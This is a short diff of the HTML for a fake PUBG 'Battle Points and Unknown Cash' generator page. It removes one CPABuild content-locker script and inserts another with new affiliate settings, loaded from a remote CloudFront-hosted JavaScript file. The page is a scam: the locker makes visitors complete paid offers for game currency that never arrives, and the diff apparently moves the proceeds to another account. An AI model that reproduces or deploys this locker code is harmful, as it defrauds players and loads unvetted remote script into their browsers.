@@ -3,14 +3,6 @@
 <!-- Fix by ITbong -->
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 
-<script type="text/javascript">
-
-    var CPABUILDSETTINGS={"it":506708,"key":"4d1ee"};
-
-</script>
-
-<script src="https://cpabuild.com/public/external/locker.js"></script>
-
 <head>
     <title>Playerunknown's Battlegrounds | Generator Online Battle Points and Unknown Cash</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -31,6 +23,12 @@
     <link href="css/magnific-popup.css" rel="stylesheet" />
     <link href="css/fancySelect.css" rel="stylesheet" />
     <link href="css/style.css" rel="stylesheet" />
+	<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":2408480,"key":"8a747"};
+</script>
+<script src="https://d12u7tum9sda5e.cloudfront.net/2c0f9ad.js"></script>
+	
+	
 </head>
 <body>
 	<div id="loader-wrapper">
